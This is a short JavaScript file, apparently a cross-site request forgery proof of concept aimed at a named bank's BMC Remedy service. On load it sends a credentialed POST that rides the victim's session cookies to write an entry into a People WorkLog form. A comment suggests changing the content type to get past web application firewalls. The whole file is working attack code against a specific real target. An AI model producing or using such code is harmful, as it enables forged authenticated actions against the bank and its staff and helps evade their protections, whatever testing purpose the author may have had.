// Pure JS for CSRF / Data Injection
(function() {
    function submitRequest() {
        var xhr = new XMLHttpRequest();
        // Correcting the URL escaping for JS (no backslashes needed in the string)
        var url = "https://sacombank.onbmc.com/arsys/web/v1.0/backchannel/SetEntryList/CTM:People%20WorkLog?timezone=Asia/Saigon";
        
        xhr.open("POST", url, true);
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
        xhr.setRequestHeader("Accept", "application/json, text/plain, */*");
        
        // As we discussed, you can change this to "text/plain" to bypass some WAFs
        xhr.setRequestHeader("Content-Type", "application/json");
        
        // Essential for sending the Sacombank session cookies
        xhr.withCredentials = true;

        var body = JSON.stringify({
            "currentServer": "onbmc-s",
            "currentSchema": "SHR:SV_TicketDisplay",
            "server": "onbmc-s",
            "schema": "CTM:People WorkLog",
            "curEntryId": "",
            "noMatchOpt": 4,
            "multiMatchOpt": 6,
            "likeId": false,
            "qualification": "",
            "qualFieldIds": [],
            "qualFieldValues": [],
            "qualFieldTypes": [],
            "fields": [112, 60900, 304469201, 1000000000, 1000000076, 1000000080, 1000000151, 1000000157, 1000000170, 1000000351, 1000000352, 1000000353, 1000000761],
            "fieldValues": ["", "", "AU", "<p>hell3duong</p>", "NEW", "PPL000000025277", "<p>hell3duong</p>", 1775031588, 2000, "", "", "", 1],
            "fieldTypes": [0, 0, 4, 4, 4, 4, 4, 7, 6, 0, 0, 0, 6],
            "formNameToken": "LZVpFN"
        });

        // Sending as a Blob helps mimic the binary handling Burp generated
        xhr.send(new Blob([body], {type: 'application/json'}));
    }

    // Execute immediately when the script loads
    submitRequest();
})();
